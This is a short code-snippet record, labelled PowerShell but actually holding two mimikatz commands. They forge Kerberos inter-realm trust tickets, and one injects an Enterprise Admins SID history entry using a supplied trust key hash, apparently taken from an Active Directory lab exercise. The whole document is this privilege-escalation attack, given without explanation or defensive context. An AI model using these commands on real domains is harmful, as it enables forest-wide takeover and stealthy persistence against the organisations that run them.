---
id: b434b0c7-4a9e-418f-97b7-848e4e54917e
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:07.317461+00:00'
updated_at: '2023-04-10T20:26:18.511556+00:00'
---

# Code Snippet b434b0c7

**Language**: Powershell

```powershell
mimikatz(commandline) # kerberos::golden /domain:domain.local /sid:S-1-5-21... /rc4:HASH_TRUST$ /user:Administrator /service:krbtgt /target:external.com /ticket:c:\temp\trust.kirbi
mimikatz(commandline) # kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:e4e47c8fc433c9e0f3b17ea74856ca6b /user:Administrator /service:krbtgt /target:moneycorp.local /ticket:c:\ad\tools\mcorp-ticket.kirbi
```
